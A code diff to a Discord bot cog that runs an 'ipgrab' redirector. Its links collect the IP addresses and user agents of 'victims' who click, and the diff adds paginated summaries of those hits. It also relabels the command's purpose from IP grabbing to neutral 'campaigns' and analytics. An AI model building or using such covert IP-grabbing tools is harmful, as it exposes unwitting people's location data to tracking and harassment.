@@ -6,6 +6,7 @@ from typing import Optional, Any
 from aiohttp import ClientSession
 from discord import Embed, User, HTTPException
 from discord.ext.commands import Cog, command, Option, Context
+from discord.ext.menus import ListPageSource, ViewMenuPages
 from discord.ext.tasks import loop
 from motor.motor_asyncio import AsyncIOMotorCollection
 
@@ -32,6 +33,54 @@ class LoggedEvent:
         self.user_agent: Optional[str] = user_agent
 
     __slots__ = ('link_id', 'redirected_to', 'redirected_at', 'remote', 'document', 'user_agent')
+
+
+class CampaignSource(ListPageSource):
+    def __init__(self, campaigns: list[tuple[str, datetime]], *, per_page: int = 10) -> None:
+        super().__init__(sorted(campaigns, key=lambda x: x[1], reverse=True), per_page=per_page)
+
+    async def format_page(self, menu, entries):
+        offset = menu.current_page * self.per_page
+
+        embed: Embed = Embed(title=f"All campaigns", color=0x00ff00)
+        embed.set_footer(text=f"Page {menu.current_page + 1}/{self.get_max_pages()}")
+
+        for iteration, entry in enumerate(entries, start=offset):
+            embed.add_field(
+                name=f"{iteration + 1}. {entry[0]}",
+                value=f"<t:{floor((entry[1] - UTC_OFFSET).timestamp())}>",
+                inline=False,
+            )
+
+        return embed
+
+
+class HitSource(ListPageSource):
+    def __init__(self, hits: list[LoggedEvent], campaign_id: str, *, per_page: int = 4) -> None:
+        self.campaign_id: str = campaign_id
+        super().__init__(sorted(hits, key=lambda x: x.redirected_at, reverse=True), per_page=per_page)
+
+    async def format_page(self, menu, entries):
+        offset = menu.current_page * self.per_page
+
+        embed: Embed = Embed(
+            title=f"Campaign {self.campaign_id} summary", color=0x00ff00, description=f"{len(self.entries)} total hits"
+        )
+        embed.set_footer(text=f"Page {menu.current_page + 1}/{self.get_max_pages()}")
+
+        for iteration, entry in enumerate(entries, start=offset):
+            entry: LoggedEvent
+            iteration: int
+            embed.add_field(
+                name=f"{iteration + 1}. ",
+                value=f"Occurred at <t:{floor((entry.redirected_at - UTC_OFFSET).timestamp())}>\n"
+                      f"Redirected to [{entry.redirected_to}]({entry.redirected_to})\n"
+                      f"IP Address: `{entry.remote}`"
+                      f"\nUser Agent: `{entry.user_agent}`" if entry.user_agent is not None else "",
+                inline=False,
+            )
+
+        return embed
 
 
 async def get_listen_doc(collection: AsyncIOMotorCollection, link_id: str) -> Document:
@@ -167,14 +216,17 @@ class Redirector(Cog):
         await listening_document.delete_db()
         await ctx.send("You are no longer listening to that campaign ID.", ephemeral=True)
 
-    @command()
+    @command(aliases=["register_listener", "make_campaign"])
     async def ipgrab(
             self,
             ctx: CustomContext,
             destination: str = Option(description="The URL to redirect the victim to."),
-            link_id: Optional[str] = Option(name="campaign_id", description="The campaign ID to listen to.")
+            link_id: Optional[str] = Option(name="campaign_id", description="The campaign ID to register.")
     ) -> None:
-        """Allows you to grab the IP address of a user by getting them to follow a link."""
+        """
+        Registers a redirector campaign.
+        This can be used for IP grabbing, analytics, link shortening, or anything else that needs to be redirected.
+        """
 
         await ctx.defer(ephemeral=True)
 
@@ -193,13 +245,59 @@ class Redirector(Cog):
         # TODO: Webhook implementation
 
         await ctx.send(
-            f"IP grabber created: <{SHORT_URL}{link_id}>\n"
+            f"Campaign link created: <{SHORT_URL}{link_id}>\n"
             f"Your campaign ID is: `{link_id}`\n"
             f"Make sure your DMs are open. You will receive notifications there.",
             ephemeral=True
         )
 
-    # TODO: Campaign summaries
+    @command()
+    async def all_campaigns(self, ctx: CustomContext) -> None:
+        """Lists all the redirector campaigns you are listening to."""
+
+        await ctx.defer(ephemeral=True)
+
+        all_campaigns: list[tuple[str, datetime]] = []
+
+        async for document in get_collection(self.bot).find({"listening_user": ctx.author.id}):
+            all_campaigns.append((document["_id"], document["created_at"]))
+
+        source: CampaignSource = CampaignSource(all_campaigns)
+
+        await ViewMenuPages(source).start(ctx, ephemeral=True)
+
+    @command()
+    async def summarize_campaign(
+            self,
+            ctx: CustomContext,
+            link_id: str = Option(name="campaign_id", description="The campaign ID to summarize."),
+    ) -> None:
+        """Summarizes a redirector campaign."""
+
+        await ctx.defer(ephemeral=True)
+
+        all_hits: list[LoggedEvent] = []
+
+        document: Document = await get_listen_doc(get_collection(self.bot), link_id)
+
+        async with self.client_session.get(f"{API_URL}hits/{document['_id']}") as response:
+            data: list[dict[str, Any]] = await response.json()
+            for entry in data:
+                timestamp: datetime = datetime.fromisoformat(entry["timestamp"])
+                all_hits.append(
+                    LoggedEvent(
+                        entry["link_id"],
+                        entry["redirected_to"],
+                        timestamp,
+                        entry["remote"],
+                        entry.get("user_agent"),
+                        document=document,
+                    )
+                )
+
+        source: HitSource = HitSource(all_hits, link_id)
+
+        await ViewMenuPages(source).start(ctx, ephemeral=True)
 
 
 def setup(bot: BOT_TYPES) -> None:
